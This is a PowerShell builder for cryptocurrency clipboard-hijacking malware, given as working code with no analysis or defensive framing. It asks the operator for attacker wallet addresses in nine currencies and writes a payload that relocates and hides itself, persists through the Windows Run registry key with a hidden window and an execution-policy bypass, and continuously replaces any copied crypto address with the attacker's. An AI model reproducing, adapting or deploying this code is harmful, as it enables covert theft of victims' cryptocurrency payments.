$host.UI.RawUI.BackgroundColor = 'Black'
$host.UI.RawUI.ForegroundColor = 'DarkGreen'

Write-Host $L
$BTC = Read-Host "BTC address" 
$ETH = Read-Host "ETH address" 
$LTC = Read-Host "LTC address" 
$TRX = Read-Host "TRX address" 
$BCH = Read-Host "BCH address" 
$NEO = Read-Host "NEO address"
$XRP = Read-Host "XRP address"  
$ZEC = Read-Host "ZEC address"
$DOGE = Read-Host "DOGE address"  


$addy = @{
    "BTC" = $BTC
    "ETH" = $ETH
    "LTC" = $LTC
    "TRX" = $TRX
    "BCH" = $BCH
    "NEO" = $NEO
    "XRP" = $XRP
    "ZEC" = $ZEC
    "DOGE" = $DOGE
}
$script = @"
`$sctpth = `$MyInvocation.MyCommand.Path
`$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]`$_})
`$ranpth = if ((Get-Random) % 2) { Join-Path `$env:TEMP "`$ran.ps1" } else { Join-Path `$env:APPDATA "`$ran.ps1" }
 Copy-Item -Path `$sctpth -Destination `$ranpth -Force
 Remove-Item -Path `$sctpth -Force

`$key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
`$valn = "Powershell"
`$val= """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""`$ranpth"""

if (!(Test-Path `$key)) {
    New-Item -Path `$key -Force | Out-Null
}

Set-ItemProperty -Path `$key -Name `$valn -Value `$val

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr hWnd = GetConsoleWindow();
    if(hWnd != IntPtr.Zero)
    {
        ShowWindow(hWnd, 0);
    }
}
'
[Console.Window]::Hide()

`$attr = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path `$ranpth -Name Attributes -Value `$attr

`$addy = @{
    "BTC" = "$($addy['BTC'])"
    "ETH" = "$($addy['ETH'])"
    "LTC" = "$($addy['LTC'])"
    "TRX" = "$($addy['TRX'])"
    "BCH" = "$($addy['BCH'])"
    "NEO" = "$($addy['NEO'])"
    "XRP" = "$($addy['XRP'])"
    "ZEC" = "$($addy['ZEC'])"
    "DOGE" = "$($addy['DOGE'])"
}
while (`$true) {
    `$clipper = Get-Clipboard
    if (`$clipper -match "^(bc1|tb1|1|3|bcrt)[a-zA-HJ-NP-Z0-9]{25,39}$") {
        `$clipper = `$addy["BTC"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    elseif (`$clipper -match "^0x[a-fA-F0-9]{40}$") {
        `$clipper = `$addy["ETH"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    
    
    elseif (`$clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,39}$") {
        `$clipper = `$addy["LTC"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    
    elseif (`$clipper -match "^T[a-zA-HJ-NP-Z0-9]{33}$") {
        `$clipper = `$addy["TRX"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    
    elseif (`$clipper -match "((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}") {
        `$clipper = `$addy["BCH"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    } 
     
     elseif (`$clipper -match "(?:^A[0-9a-zA-Z]{33}$)") {
        `$clipper = `$addy["NEO"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
    }
    elseif (`$clipper -match "(?:^r[0-9a-zA-Z]{24,34}$)") {
        `$clipper = `$addy["XRP"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
    }
    
  elseif (`$clipper -match "^t1[a-zA-HJ-NP-Za-km-z0-9]{33}$") {
        `$clipper = `$addy["ZEC"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
}


 elseif (`$clipper -match "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$") {
        `$clipper = `$addy["DOGE"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
}
   Start-Sleep -Seconds 0
}
"@

$guid = [guid]::NewGuid()
$ransave = "$($guid.ToString().Substring(0,8)).ps1"
$path = (New-Object -ComObject "Shell.Application").BrowseForFolder(0, "Hello boy haha", 0, "C:\").Self.Path + "\" + $ransave
$script | Out-File -FilePath $path
